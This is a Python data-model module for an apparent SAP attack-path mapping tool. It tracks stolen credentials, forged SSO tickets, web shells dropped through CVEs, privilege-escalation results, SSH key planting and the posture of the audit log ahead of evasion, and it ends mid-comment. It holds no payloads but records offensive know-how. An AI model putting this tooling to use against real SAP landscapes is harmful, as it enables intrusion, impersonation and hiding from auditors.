#!/usr/bin/env python3
"""
SAPMAP Data Models — Core dataclasses for the SAP Landscape Attack Path Mapper.

Defines SAPNode (system on the map), RFCConnection (link between systems),
CreatedUser (tracking artifact), and SAPMAPState (full session state).
All models support JSON serialization via to_dict()/from_dict().
"""

from __future__ import annotations

import copy
import json
import re as _re
from dataclasses import dataclass, field, fields
from datetime import datetime
from enum import IntEnum
from typing import Any, Optional


_IPV4_RE = _re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def _looks_like_ipv4(host: str) -> bool:
    return bool(_IPV4_RE.match(host or ""))


# ---------------------------------------------------------------------------
# Severity (reuse SAPology convention)
# ---------------------------------------------------------------------------

class Severity(IntEnum):
    CRITICAL = 5
    HIGH = 4
    MEDIUM = 3
    LOW = 2
    INFO = 1


SEVERITY_COLORS = {
    Severity.CRITICAL: "#e74c3c",
    Severity.HIGH:     "#e67e22",
    Severity.MEDIUM:   "#f1c40f",
    Severity.LOW:      "#3498db",
    Severity.INFO:     "#95a5a6",
}

SEVERITY_LABELS = {
    Severity.CRITICAL: "CRITICAL",
    Severity.HIGH:     "HIGH",
    Severity.MEDIUM:   "MEDIUM",
    Severity.LOW:      "LOW",
    Severity.INFO:     "INFO",
}


# ---------------------------------------------------------------------------
# Finding (lightweight copy from SAPology for standalone use)
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    name: str
    severity: Severity
    description: str = ""
    # ``remediation`` accepts EITHER a legacy plain string (old Finding
    # constructors and old .sapmap files) OR a structured dict matching
    # modules.core.sapmap_remediation.Remediation.to_dict().  Renderers
    # check the type and route to the right layout.
    remediation: object = ""
    detail: str = ""
    # MITRE ATT&CK Enterprise technique IDs ("T1190", "T1078.001").  Names
    # and tactics are looked up at render time via modules.core.sapmap_attack
    # so .sapmap state files stay small and the catalog stays the single
    # source of truth.  Empty list = capability is explicitly un-mapped or
    # the finding pre-dates the mapping addition.
    attack_techniques: list = field(default_factory=list)

    def to_dict(self) -> dict:
        # Pass dict-shaped remediation through verbatim; coerce anything
        # else to its string form so legacy callers stay JSON-clean.
        rem = self.remediation
        if not isinstance(rem, (dict, str)):
            rem = str(rem) if rem else ""
        if isinstance(rem, dict):
            rem = dict(rem)
        return {
            "name": self.name,
            "severity": int(self.severity),
            "severity_label": SEVERITY_LABELS.get(self.severity, "UNKNOWN"),
            "description": self.description,
            "remediation": rem,
            "detail": self.detail,
            "attack_techniques": list(self.attack_techniques or []),
        }

    @classmethod
    def from_dict(cls, d: dict) -> Finding:
        return cls(
            name=d["name"],
            severity=Severity(d["severity"]),
            description=d.get("description", ""),
            remediation=d.get("remediation", ""),
            detail=d.get("detail", ""),
            attack_techniques=list(d.get("attack_techniques", [])),
        )


# ---------------------------------------------------------------------------
# Instance info (port-level detail for a single SAP instance)
# ---------------------------------------------------------------------------

@dataclass
class InstanceInfo:
    instance_nr: str           # e.g. "00"
    ip: str = ""
    ports: dict = field(default_factory=dict)        # {port_int: "open"/"service_name"}
    services: dict = field(default_factory=dict)      # {service_name: detail}
    info: dict = field(default_factory=dict)           # arbitrary k/v from sapcontrol etc.

    def to_dict(self) -> dict:
        return {
            "instance_nr": self.instance_nr,
            "ip": self.ip,
            "ports": {str(k): v for k, v in self.ports.items()},
            "services": self.services,
            "info": self.info,
        }

    @classmethod
    def from_dict(cls, d: dict) -> InstanceInfo:
        return cls(
            instance_nr=d["instance_nr"],
            ip=d.get("ip", ""),
            ports={int(k): v for k, v in d.get("ports", {}).items()},
            services=d.get("services", {}),
            info=d.get("info", {}),
        )


# ---------------------------------------------------------------------------
# Credentials for a system+client
# ---------------------------------------------------------------------------

@dataclass
class Credentials:
    username: str
    password: str
    client: str = "000"
    instance_nr: str = "00"
    verified: bool = False     # True if test connection succeeded
    # Tag distinguishing which auth surface this credential is for.
    # "" = generic SAP RFC/DIAG (default).
    # "wd_admin" = HTTP Basic auth on the WD's /sap/wdisp/admin.
    # "scc"      = SCC's Spring-Security admin login.
    # Allows downstream actions to find the right credential for the
    # right surface without ambiguity (e.g. the WD admin-table puller
    # looks for kind=='wd_admin', not the ABAP DDIC user).
    kind: str = ""
    # Optional alias for instance_nr — historic SAPMAP code uses both
    # `instance_nr` and `instance`; accept either at construction time.
    instance: str = ""

    def __post_init__(self):
        # Reconcile the dual-field thing: if caller passed `instance`,
        # mirror it onto instance_nr.  Keeps to_dict round-trips clean.
        if self.instance and not self.instance_nr:
            self.instance_nr = self.instance
        elif self.instance_nr and not self.instance:
            self.instance = self.instance_nr

    def to_dict(self) -> dict:
        return {
            "username": self.username,
            "password": self.password,
            "client": self.client,
            "instance_nr": self.instance_nr,
            "verified": self.verified,
            "kind": self.kind,
        }

    @classmethod
    def from_dict(cls, d: dict) -> Credentials:
        # Drop any unknown keys so the dataclass __init__ doesn't choke
        # on legacy / future fields.
        known = {"username", "password", "client", "instance_nr",
                  "verified", "kind"}
        return cls(**{k: v for k, v in d.items() if k in known})


# ---------------------------------------------------------------------------
# Created user tracking
# ---------------------------------------------------------------------------

@dataclass
class CreatedUser:
    username: str
    sid: str
    client: str
    hostname: str
    ip: str
    instance_nr: str
    method: str               # "gw_exploit", "bapi_create", "provided"
    password: str = ""
    created_at: str = ""

    def __post_init__(self):
        if not self.created_at:
            self.created_at = datetime.now().isoformat()

    def to_dict(self) -> dict:
        return {
            "username": self.username,
            "sid": self.sid,
            "client": self.client,
            "hostname": self.hostname,
            "ip": self.ip,
            "instance_nr": self.instance_nr,
            "method": self.method,
            "password": self.password,
            "created_at": self.created_at,
        }

    @classmethod
    def from_dict(cls, d: dict) -> CreatedUser:
        return cls(**d)


# ---------------------------------------------------------------------------
# ForgedTicket — a forged MYSAPSSO2 logon ticket
# ---------------------------------------------------------------------------
#
# Captures the output of the MYSAPSSO2 ticket-forgery chain
# (sap_mysapsso2.forge_ticket) plus enough provenance to:
#   - re-use the ticket against any STRUSTSSO2-trusted receiver
#   - track which receivers have actually been propagated to
#   - decide when the ticket has expired and can be discarded
#   - audit the source PSE that signed it
#
# Stored on `SAPNode.forged_tickets` (issuer side) and mirrored
# into `SAPMAPState.forged_tickets` (global list) so the UI can
# enumerate all live forgeries irrespective of which node they
# came from.  Mirrors the `CreatedUser` two-tier pattern.

@dataclass
class ForgedTicket:
    """A forged MYSAPSSO2 logon ticket with replay-tracking metadata."""

    # ── Impersonation context (the "logon claim") ─────────────────
    user: str                       # impersonated user (e.g. "SAP*", "DDIC")
    client: str                     # MANDT (e.g. "100", "000")
    sid: str                        # issuing SID (whose SAPSYS.pse signed it)

    # ── The ticket itself ─────────────────────────────────────────
    cookie_b64: str                 # base64 ticket — drop-in for HTTP /
                                    # pyrfc / .sap shortcut at= line
    ticket_size: int = 0            # size in bytes (display only)

    # ── Validity window ───────────────────────────────────────────
    forged_at: str = ""             # ISO timestamp when forge_ticket ran
    validity_min: int = 120         # SAP ValidTimeInM from InfoUnit 0x07

    # ── Optional recipient pinning ────────────────────────────────
    # When set, the ticket carries 0x0A/0x0B InfoUnits restricting
    # acceptance to a specific receiver.  Empty = open (replays
    # against any node in the issuer's STRUSTSSO2 trust subgraph).
    recipient_sid: str = ""
    recipient_client: str = ""

    # ── Signer provenance (cert details from the SAPSYS that
    # signed the ticket; useful for forensics + STRUSTSSO2 lookup) ─
    signer_dn: str = ""             # subject DN of the SAPSYS cert
    signer_serial: str = ""         # cert serial number (hex)

    # ── Exploitation provenance ───────────────────────────────────
    source_sid: str = ""            # SID of the system we extracted
                                    # the signing PSE from (== sid in
                                    # the simple case, may differ when
                                    # the signer is in a parent system)
    source_node_ip: str = ""        # IP of the exploited host
    method: str = "ticket_forge"    # for parity with CreatedUser.method

    # ── Replay tracking ───────────────────────────────────────────
    # Each entry: {"sid", "client", "at", "result", "channel"}
    # channel ∈ {"http", "pyrfc", "sapgui"}
    # result ∈ {"success", "rejected", "expired", "error"}
    used_on: list = field(default_factory=list)

    # ── Misc / display ────────────────────────────────────────────
    loot_path: str = ""             # path to the .sap / curl.sh / pyrfc.json
                                    # bundle on disk (see sap_ticket_delivery)
    label: str = ""                 # operator-supplied short label

    def __post_init__(self):
        if not self.forged_at:
            self.forged_at = datetime.now().isoformat()
        if not self.source_sid:
            self.source_sid = self.sid

    def is_expired(self, now: Optional[datetime] = None) -> bool:
        """True if the ticket's validity window has passed.

        SAP receivers reject tickets older than the validity window
        even if the signature is valid.  Operators should not bother
        replaying expired tickets.
        """
        if not self.forged_at:
            return False
        if now is None:
            now = datetime.now()
        try:
            t = datetime.fromisoformat(self.forged_at)
        except ValueError:
            return False
        # validity_min is the SAP ValidTimeInM; treat negative as
        # "no expiry tracked" (legacy tickets without InfoUnit 0x07)
        if self.validity_min <= 0:
            return False
        age_sec = (now - t).total_seconds()
        return age_sec > self.validity_min * 60

    def remaining_minutes(self,
                          now: Optional[datetime] = None) -> int:
        """Whole minutes left in the validity window (negative = past)."""
        if not self.forged_at or self.validity_min <= 0:
            return self.validity_min
        if now is None:
            now = datetime.now()
        try:
            t = datetime.fromisoformat(self.forged_at)
        except ValueError:
            return self.validity_min
        age_sec = (now - t).total_seconds()
        return int(self.validity_min - age_sec / 60)

    def display_label(self) -> str:
        """Short one-line label for menu / tooltip use."""
        rem = self.remaining_minutes()
        pin = (f" → {self.recipient_sid}/{self.recipient_client}"
               if self.recipient_sid else "")
        if self.is_expired():
            return f"{self.user}@{self.sid}/{self.client}{pin} (expired)"
        return (f"{self.user}@{self.sid}/{self.client}{pin} "
                f"({rem} min left)")

    def record_use(self, sid: str, client: str, result: str,
                    channel: str = "") -> None:
        """Append a replay attempt to ``used_on`` with a timestamp."""
        self.used_on.append({
            "sid": sid,
            "client": client,
            "at": datetime.now().isoformat(),
            "result": result,
            "channel": channel,
        })

    def to_dict(self) -> dict:
        # Server-computed validity helpers — surfaced so the GUI
        # doesn't have to repeat the date-math in JavaScript (which
        # is brittle across browsers when parsing ISO timestamps).
        try:
            remaining = self.remaining_minutes()
            expired = self.is_expired()
        except Exception:
            remaining = self.validity_min
            expired = False
        return {
            "user": self.user,
            "client": self.client,
            "sid": self.sid,
            "cookie_b64": self.cookie_b64,
            "ticket_size": self.ticket_size,
            "forged_at": self.forged_at,
            "validity_min": self.validity_min,
            "remaining_minutes": remaining,   # server-computed (UI)
            "expired": expired,                # server-computed (UI)
            "display_label": self.display_label(),
            "recipient_sid": self.recipient_sid,
            "recipient_client": self.recipient_client,
            "signer_dn": self.signer_dn,
            "signer_serial": self.signer_serial,
            "source_sid": self.source_sid,
            "source_node_ip": self.source_node_ip,
            "method": self.method,
            "used_on": list(self.used_on),
            "loot_path": self.loot_path,
            "label": self.label,
        }

    @classmethod
    def from_dict(cls, d: dict) -> ForgedTicket:
        return cls(
            user=d["user"],
            client=d["client"],
            sid=d["sid"],
            cookie_b64=d["cookie_b64"],
            ticket_size=d.get("ticket_size", 0),
            forged_at=d.get("forged_at", ""),
            validity_min=d.get("validity_min", 120),
            recipient_sid=d.get("recipient_sid", ""),
            recipient_client=d.get("recipient_client", ""),
            signer_dn=d.get("signer_dn", ""),
            signer_serial=d.get("signer_serial", ""),
            source_sid=d.get("source_sid", ""),
            source_node_ip=d.get("source_node_ip", ""),
            method=d.get("method", "ticket_forge"),
            used_on=list(d.get("used_on", [])),
            loot_path=d.get("loot_path", ""),
            label=d.get("label", ""),
        )


# ---------------------------------------------------------------------------
# TrustRelation — STRUSTSSO2 trust edge between two SAP systems
# ---------------------------------------------------------------------------
#
# A trust edge from system T (trusting/receiver) to system I (issuer):
# "T trusts MYSAPSSO2/assertion tickets signed by I's SAPSYS.pse."
#
# Discovered by reading T's STRUSTSSO2-related tables (USRACL, USREXTID)
# or by parsing T's SAPSYS.pse trustbox.  Cross-referenced against
# known SAPNode.sapsys_cert_subject_dn to identify the issuer system.
#
# Enables Tier 2 lateral movement: if we steal I's SAPSYS.pse private
# key, we can forge tickets accepted by every T that trusts I.

@dataclass
class TrustRelation:
    """An STRUSTSSO2 trust edge: trusting_sid accepts tickets from issuer_sid."""

    trusting_sid: str               # Receiver — who accepts the ticket
    trusting_client: str = ""       # MANDT scope on the receiver (empty = any)

    # Issuer identification — at least one of issuer_sid OR
    # issuer_cert_subject_dn must be populated.  When the SID can be
    # resolved by cross-referencing SAPNode.sapsys_cert_subject_dn,
    # issuer_sid is filled in; otherwise we keep the raw cert DN so
    # the operator can still see what's trusted.
    issuer_sid: str = ""
    issuer_cert_subject_dn: str = ""
    issuer_cert_serial: str = ""

    # How we found this trust edge
    trust_method: str = "strustsso2"  # "strustsso2" | "usracl" | "pse_trustbox"
    discovered_via: str = ""           # FM/table name used
    discovered_at: str = ""

    def __post_init__(self):
        if not self.discovered_at:
            self.discovered_at = datetime.now().isoformat()

    def to_dict(self) -> dict:
        return {
            "trusting_sid": self.trusting_sid,
            "trusting_client": self.trusting_client,
            "issuer_sid": self.issuer_sid,
            "issuer_cert_subject_dn": self.issuer_cert_subject_dn,
            "issuer_cert_serial": self.issuer_cert_serial,
            "trust_method": self.trust_method,
            "discovered_via": self.discovered_via,
            "discovered_at": self.discovered_at,
        }

    @classmethod
    def from_dict(cls, d: dict) -> TrustRelation:
        return cls(
            trusting_sid=d["trusting_sid"],
            trusting_client=d.get("trusting_client", ""),
            issuer_sid=d.get("issuer_sid", ""),
            issuer_cert_subject_dn=d.get("issuer_cert_subject_dn", ""),
            issuer_cert_serial=d.get("issuer_cert_serial", ""),
            trust_method=d.get("trust_method", "strustsso2"),
            discovered_via=d.get("discovered_via", ""),
            discovered_at=d.get("discovered_at", ""),
        )


# ---------------------------------------------------------------------------
# AbapTelemetryProfile — read-only audit/trace posture snapshot
# ---------------------------------------------------------------------------

@dataclass
class AbapTelemetryProfile:
    """ABAP-side telemetry posture, captured read-only over RFC.

    Tier 1 OPSEC enrichment (see docs/research/13_detection_evasion_plan.md
    §6.1 Tier 1).  Tells the operator what audit/trace surfaces are on or
    off **before** any decision to act.  Populated by
    ``sapmap_telemetry.read_abap_telemetry``; no writes, no tampering.
    """

    # SAL (Security Audit Log)
    sal_state: str = "unknown"           # on / off / unknown / unknown_legacy / unauth
    sal_filter_slots: int = 0            # populated RSAU_PERS / RSAUPROF rows (often 0 — runtime filter slots aren't always exposed there)
    sal_filter_slots_configured: str = "unknown"  # rsau/selection_slots — slots allocated in kernel memory
    sal_filter_scope: str = ""           # "narrow" | "broad" | "" (any slot covers all users + all classes → broad)
    sal_integrity: str = "unknown"       # on / off / unknown — value of rsau/integrity
    sal_source_ip_only: str = "unknown"  # on / off / unknown — value of rsau/ip_only

    # Other audit / trace control parameters
    rec_client: str = "unknown"          # rec/client (DBTABLOG scope) — "OFF" / "ALL" / "<n>" / "unknown"
    stat_level: str = "unknown"          # stat/level (STAD workload statistics)
    gw_logging: str = "unknown"          # gw/logging (gateway access log spec)
    rdisp_trace: str = "unknown"         # rdisp/TRACE (work-process trace verbosity)

    # Provenance
    probed_at: str = ""
    error: str = ""                      # populated when probe failed; profile otherwise empty

    # Raw parameter values keyed by parname for downstream consumers that
    # want the unparsed source.  Empty when probe failed.
    raw_params: dict = field(default_factory=dict)

    def __post_init__(self):
        if not self.probed_at:
            self.probed_at = datetime.now().isoformat()

    def to_dict(self) -> dict:
        return {
            "sal_state": self.sal_state,
            "sal_filter_slots": self.sal_filter_slots,
            "sal_filter_slots_configured": self.sal_filter_slots_configured,
            "sal_filter_scope": self.sal_filter_scope,
            "sal_integrity": self.sal_integrity,
            "sal_source_ip_only": self.sal_source_ip_only,
            "rec_client": self.rec_client,
            "stat_level": self.stat_level,
            "gw_logging": self.gw_logging,
            "rdisp_trace": self.rdisp_trace,
            "probed_at": self.probed_at,
            "error": self.error,
            "raw_params": dict(self.raw_params or {}),
        }

    @classmethod
    def from_dict(cls, d: dict) -> AbapTelemetryProfile:
        return cls(
            sal_state=d.get("sal_state", "unknown"),
            sal_filter_slots=int(d.get("sal_filter_slots", 0) or 0),
            sal_filter_slots_configured=d.get(
                "sal_filter_slots_configured", "unknown"),
            sal_filter_scope=d.get("sal_filter_scope", ""),
            sal_integrity=d.get("sal_integrity", "unknown"),
            sal_source_ip_only=d.get("sal_source_ip_only", "unknown"),
            rec_client=d.get("rec_client", "unknown"),
            stat_level=d.get("stat_level", "unknown"),
            # Accept the prior `gw_log_level` key for state files written
            # by an older snapshot of this code — value is meaningless
            # (it was the wrong parameter) but won't blow up loading.
            gw_logging=d.get("gw_logging", d.get("gw_log_level", "unknown")),
            rdisp_trace=d.get("rdisp_trace", "unknown"),
            probed_at=d.get("probed_at", ""),
            error=d.get("error", ""),
            raw_params=dict(d.get("raw_params") or {}),
        )


# ---------------------------------------------------------------------------
# SAPNode — a system on the map
# ---------------------------------------------------------------------------

@dataclass
class SAPNode:
    """An SAP system discovered and plotted on the SAPMAP."""

    sid: str
    system_type: str = ""               # ABAP, JAVA, ABAP+JAVA, BUSINESSOBJECTS, etc.
    hostname: str = ""
    ip: str = ""
    instances: list = field(default_factory=list)   # [InstanceInfo, ...]
    os_type: str = ""
    db_type: str = ""                   # HDB, ORA, MSS, ADA, DB6
    kernel: str = ""
    sap_release: str = ""
    # External DBs this ABAP calls via NATIVE_SQL / ADBC (DBCON
    # entries paired with RSECTAB /DBCON/<CONNAME> passwords).
    # Populated by sap_dbcon_probe.integrate_dbcon_from_secstore.
    # Issue #21.
    dbcon_edges: list = field(default_factory=list)   # [DBCONConnection, ...]
    # CTS/TMS destinations this ABAP has for cross-system transport
    # moves (TMSADM@<SID>.DOMAIN_<DOMAIN> entries paired with
    # RSECTAB /RFC/TMSADM@... passwords).  Populated by
    # sap_tms_probe.integrate_tms_from_secstore.  Bundle 1 of the
    # CTS/TMS epic.
    tms_destinations: list = field(default_factory=list)  # [TMSDestination, ...]
    clients: list = field(default_factory=list)     # [{"nr": "100", "category": "P"}, ...]
    is_production: bool = False
    findings: list = field(default_factory=list)    # [Finding, ...]
    has_critical_finding: bool = False
    pwned: bool = False
    # Set True when a source SAP system's X.509 identity (STRUST
    # PSE) authenticated successfully at the TLS layer against this
    # target — kernel-proxied via HTTP_CLIENT_CREATE_BY_DESTINATION.
    # Distinguishes "our cert is trusted" (transport-layer breach —
    # deserves attention but stops short of ``pwned``) from "we hit
    # an authenticated endpoint that answered 2xx" (full pwn, which
    # DOES flip ``pwned=True`` + ``has_critical_finding=True``).
    #
    # Rendered in the GUI as a distinct border glow so the operator
    # sees the trust-only-vs-fully-authenticated distinction at a
    # glance.
    cert_auth_trusted: bool = False
    credentials: list = field(default_factory=list) # [Credentials, ...]
    created_users: list = field(default_factory=list)  # [CreatedUser, ...]
    # Forged MYSAPSSO2 logon tickets — signed by THIS system's
    # SAPSYS.pse and usable across its STRUSTSSO2 trust subgraph.
    # See ForgedTicket / sap_mysapsso2.forge_ticket for details.
    forged_tickets: list = field(default_factory=list)  # [ForgedTicket, ...]
    # ICM HTTP/HTTPS service ports discovered from this AS's
    # ``icm/server_port_<N>`` profile entries.  Populated by the
    # SSO2 pre-flight check (RFC PFL_GET_SINGLE_PARAMETER or the
    # profile-file fallback — either path produces the same
    # list).  Read by ``sap_ticket_propagate`` to pick the right
    # ports for cookie replay — strictly more reliable than the
    # SAP-convention guess (80NN/443NN) or the scanner's tag
    # heuristic (which sometimes promotes ICM admin ports
    # 1128/1129 to "http"/"https" service candidates).
    # Each entry: {port: int, protocol: 'http'|'https', index: int,
    #              raw: <original profile value>}
    icm_ports: list = field(default_factory=list)
    sapology_data: dict = field(default_factory=dict)
    gw_vulnerable: bool = False         # True if SAPXPG gateway exploit works
    gw_vulnerable_port: int = 0         # The specific gateway port that is vulnerable
    ms_port: int = 0                    # MS internal port found (39NN), 0 = not found
    ms_vulnerable: bool = False         # True if MS lacks ACL protection (CVE-2020-6207)
    ms_acl_protected: bool = False      # True if MS port reachable but ACL blocks our IP
    # CVE-2025-31324 — Java VisualComposer metadatauploader unauth RCE
    cve_2025_31324_checked: bool = False
    cve_2025_31324_vulnerable: bool = False
    cve_2025_31324_port: int = 0        # HTTP port that answered (50000 + nn*100)
    cve_2025_31324_https: bool = False  # True if probed via HTTPS
    cve_2025_31324_evidence: str = ""   # short reason string
    cve_2025_31324_shells: list = field(default_factory=list)  # [{url, name, dropped_at}]
    # CVE-2020-6287 (RECON) — LM Configuration Wizard unauth user creation
    cve_2020_6287_checked: bool = False
    cve_2020_6287_vulnerable: bool = False
    cve_2020_6287_port: int = 0
    cve_2020_6287_https: bool = False
    cve_2020_6287_evidence: str = ""
    # CVE-2022-22536 (ICMAD) — ICM/Web Dispatcher HTTP request smuggling.
    # Per SAP Note 3123396, the bug ONLY exploits when a gateway (Web
    # Dispatcher or 3rd-party reverse proxy) sits in front; direct ICM
    # access is detectable on the wire but the loopback-trust ACL bypass
    # has nowhere to land.  Severity therefore differentiates "kernel
    # behind patch table" (info) vs "smuggle probe confirmed on the
    # wire" (high) vs "ACL bypass confirmed reaching a sensitive path"
    # (critical) — see docs/research/10_icmad_implementation_plan.md.
    cve_2022_22536_checked: bool = False
    cve_2022_22536_vulnerable: bool = False
    cve_2022_22536_port: int = 0
    cve_2022_22536_https: bool = False
    cve_2022_22536_evidence: str = ""           # ≤256 bytes of the 2nd response
    cve_2022_22536_acl_bypass: dict = field(default_factory=dict)
    # {path: {"status": int, "snippet": str, "via": "smuggle"|"baseline"}}
    # WD fingerprint flag — populated by a tiny TLS/HTTP probe.  Drives
    # ICMAD severity escalation (gateway-fronted = real exploit chain).
    is_web_dispatcher: bool = False
    # WD cache state — drives ICMAD severity (cache-poisoning chain
    # only fires when the WD has wdisp/cache_enabled=1).  Discovered by
    # detect_wd_cache() via Age/x-cache header + timing comparison on a
    # cacheable static asset.  See _WD_CACHE_PROBES in sapmap_scanner.
    wd_cache_enabled: bool = False
    wd_cache_evidence: str = ""
    # WD-to-backend routing topology — populated by discover_wd_backends().
    # Each entry is a dict: {signature, url_prefixes, server_header,
    # wd_version_hint, likely_sid, linked_node_sid, is_suppressed}.
    # `linked_node_sid` is filled in post-discovery when one of the
    # observed backends matches a SAPNode already on the map (matched
    # by server-header substring or shared kernel).  Drives the
    # WD → backend edges in the landscape SVG.
    wd_backends: list = field(default_factory=list)
    # Set when this SAPNode is a SYNTHETIC PLACEHOLDER auto-created
    # from a WD's backend topology — i.e. we know SOMETHING is behind
    # the WD (because the WD's Server header was different from the
    # WD-local handler's), but we don't know its real SID/IP/hostname.
    # Holds the SID of the WD that revealed it.  GUI renders these
    # placeholder nodes with a dashed border + lower opacity.
    discovered_via_wd_sid: str = ""
    # Telnet console endpoint override (e.g. "127.0.0.1:50008" when the
    # target's admin telnet is localhost-bound and the operator has an
    # SSH tunnel).  Empty => derive from node.ip + default 5NN08.
    telnet_override: str = ""
    # Set to True after a post-RECON deploy attempt (CTC ConfigServlet
    # and Telnet console) is confirmed unavailable.  Used by the GUI
    # to grey out data-extraction actions that require JSP deployment
    # — RECON alone (user-creation only) is not enough for SecStore /
    # table dumps / impact probes.
    java_deploy_blocked: bool = False
    # Java Secure Store extraction state (SecStoreFS + J2EE_CONFIGENTRY)
    java_secstore_checked: bool = False
    java_secstore_version: str = ""
    java_secstore_algorithm: str = ""
    java_secstore_entries: list = field(default_factory=list)  # [{name,kind,target_sid,client,value,is_downstream}]
    java_ume_jsps: list = field(default_factory=list)  # [{url, deployed_at}] — cached UME create-user JSPs
    java_destinations: list = field(default_factory=list)  # [{name,target_sid,ashost,sysnr,client,user,password,...}]
    secstore_entries: list = field(default_factory=list)  # [{ident, password, category, ...}]
    impact_results: list = field(default_factory=list)   # [ImpactResult.to_dict(), ...]
    saprouter: str = ""                 # SAProuter route string prefix (e.g., "/H/router/S/3299/W/pass")
    saprouter_info: dict = field(default_factory=dict)  # SAProuter info leak results
    # SNC (Secure Network Communications) posture — info only, no Finding.
    # Populated by modules.protocols.sap_snc (scan_snc_diag / scan_snc_router).
    # Shape: {checked, protocol, host, port, enabled, enforced, qop_use,
    #         qop_max, qop_min, qop_flag, mech_id, mech_label, cryptolib,
    #         error}.  Empty dict = never probed.
    snc_info: dict = field(default_factory=dict)
    scc_links: list = field(default_factory=list)       # SCC hosts whose mappings reach this node
    # Inbound trusted-RFC ACL (from RFCSYSACL table).  Each entry:
    # {rfcsysid, rfcclient, rfcequser, rfcuser, rfcsnc, rfcsameusr}
    rfcsysacl_entries: list = field(default_factory=list)
    # SAPSYS PSE certificate provenance — populated when the PSE is
    # extracted (extract_and_forge_ticket).  Used to cross-reference
    # STRUSTSSO2 trust entries on OTHER systems so we can identify
    # them as "trust THIS system's signer key" → forgery targets.
    sapsys_cert_subject_dn: str = ""
    sapsys_cert_issuer_dn: str = ""
    sapsys_cert_serial: str = ""
    # USREXTID entries — user-level external identity mappings (X.509
    # DN, LDAP DN, SAML NameID, email) discovered during STRUSTSSO2
    # trust scan.  Intelligence only — not used for ticket forgery
    # (that requires system-level trust via TWPSSO2ACL or PSE trustbox).
    # Each entry: {extid, bname, trusting_client, source}
    usrextid_entries: list = field(default_factory=list)
    # Read-only OPSEC posture: SAL on/off, integrity, source-IP enforcement,
    # rec/client, stat/level, gw/log_level, rdisp/TRACE.  Populated by
    # ``sapmap_telemetry.read_abap_telemetry`` after SAP_ALL acquisition.
    telemetry_profile: Optional[AbapTelemetryProfile] = None
    position: Optional[tuple] = None    # (x, y) on map — None = auto-layout

    # Linux LPE state.  Two techniques covered today:
    #   * Copy Fail (CVE-2026-31431) — pure-Python AF_ALG AEAD bug
    #   * Dirty Frag (no CVE, embargo broke 2026) — vendored static
    #     binary chaining xfrm-ESP + RxRPC page-cache writes
    # ``linux_lpe_method`` records which technique the auto-picker
    # selected on the most recent check ("copyfail" / "dirtyfrag" / "").
    copyfail_vulnerable: bool = False    # True if kernel + authencesn + python3
    copyfail_root_obtained: bool = False # True after successful root cmd exec
    copyfail_kernel: str = ""            # kernel version string from uname -r
    dirtyfrag_vulnerable: bool = False   # True if esp_path_ok || rxrpc_path_ok
    dirtyfrag_root_obtained: bool = False
    dirtyfrag_kernel: str = ""
    # pedit-COW (CVE-2026-46331) — partial-COW write in net/sched/
    # act_pedit.c.  Vulnerable kernel range 5.18 → 7.1-rc6.  Needs
    # user.max_user_namespaces > 0 to get CAP_NET_ADMIN inside the
    # new netns.  Deterministic (single-shot, not a race) which is
    # the operator-visible advantage over the other two.
    peditcow_vulnerable: bool = False
    peditcow_root_obtained: bool = False
    peditcow_kernel: str = ""
    linux_lpe_method: str = ""           # "copyfail" / "dirtyfrag" / "peditcow" / ""

    # Virtual SAP Death Star arm state — public so the GUI can gate the
    # Disarm menu on ``death_star_hook_pid > 0`` (only enable Disarm
    # when a hook is actually running).  Set by
    # ``tier3_sal_death_star_launch`` after a successful arm, cleared
    # to 0 by ``tier3_sal_death_star_stop`` after a clean disarm.
    # Deployment paths + pidfile stay on the private ``_death_star_state``
    # attribute — this field only exposes the "is it armed?" bit.
    death_star_hook_pid: int = 0

    # SSH key harvest + lateral movement state
    ssh_keys_harvested: bool = False     # True after sap_ssh_lateral.ssh_harvest()
    ssh_keys_planted: bool = False       # True after sap_ssh_lateral.ssh_plant_key()
    ssh_access: list = None              # SSH lateral movement entries (from_sid, key, user)

    # Windows LPE state.  Currently one technique:
    #   * MiniPlasma — cldflt.sys race (CVE-2020-17103, silently un-patched
    #     per Nightmare-Eclipse's 2025 reinvestigation).  Vendored .NET
    #     4.7.2 single-file binary; SAPXPG-delivered, runs the wrapper
    #     batch as NT AUTHORITY\SYSTEM via WER scheduled-task hijack.
    # ``windows_lpe_method`` records which technique the auto-picker
    # selected on the most recent check ("miniplasma" / "").
    miniplasma_vulnerable: bool = False  # True if Win10 1709+ + cldflt.sys + .NET 4.7.2
    miniplasma_system_obtained: bool = False  # True after successful SYSTEM cmd
    miniplasma_os_build: str = ""        # e.g. "10.0.19045" — from cmd /C ver
    # GodPotato — SeImpersonate → SYSTEM via DCOM/RPC unmarshal trick.
    # Works on Server 2012-2022 + Win10/11; needs the calling user to
    # hold SeImpersonatePrivilege (SAP service accounts <sid>adm /
    # SAPService<SID> always do by default).  Covers the gap below the
    # cldflt.sys threshold where MiniPlasma can't fire.
    godpotato_vulnerable: bool = False   # True iff SeImpersonate held + .NET 2.0+
    godpotato_system_obtained: bool = False
    godpotato_os_build: str = ""
    godpotato_has_impersonate: bool = False
    # EfsPotato — SeImpersonate → SYSTEM via MS-EFSR coercion of lsass.
    # Works on Server 2012-2022 + Win10/11 AND handles NETWORK SERVICE
    # token contexts where GodPotato's DCOM trick can't promote the
    # impersonation level.  Same prerequisites: SeImpersonate +
    # .NET 4.7.2+.  Preferred over GodPotato for the broadest
    # service-account coverage.
    efspotato_vulnerable: bool = False
    efspotato_system_obtained: bool = False
    efspotato_os_build: str = ""
    efspotato_has_impersonate: bool = False
    windows_lpe_method: str = ""         # "miniplasma" / "godpotato" / "efspotato" / ""

    # dpmon virtual SAP* activation (SAP Note 3303172, kernel >= 790).
    # OS-exec primitive that lets any process running as <sid>adm
    # request a 10-30 min one-time password for the virtual super-user
    # SAP* in a chosen ABAP client.  Used by both the LPE chain
    # (escalate existing creds via the OTP) and the Phase-2 exploit
    # chain (create SAPMAP00 via the OTP after BAPI_USER_CREATE1).
    # ABAP-only feature — pure-Java AS has no ABAP runtime; gate on
    # is_dpmon_sap_star_available(kernel, system_type).
    dpmon_sap_star_available: bool = False  # True iff kernel>=790 AND ABAP stack
    dpmon_sap_star_used: bool = False       # True after a successful OTP-driven create

    # Discovery provenance.  Set when a node is materialised purely
    # from a BTP destination (no scanner / RFC observation yet) so the
    # GUI can render it as an unverified placeholder until the
    # operator runs Test Connection / scan against it.
    discovered_via_btp: bool = False
    # True when this node was auto-materialised from a Type-G RFC
    # destination on another SAP system (source's RFCDES points at
    # this host).  Same GUI treatment as discovered_via_btp — dashed
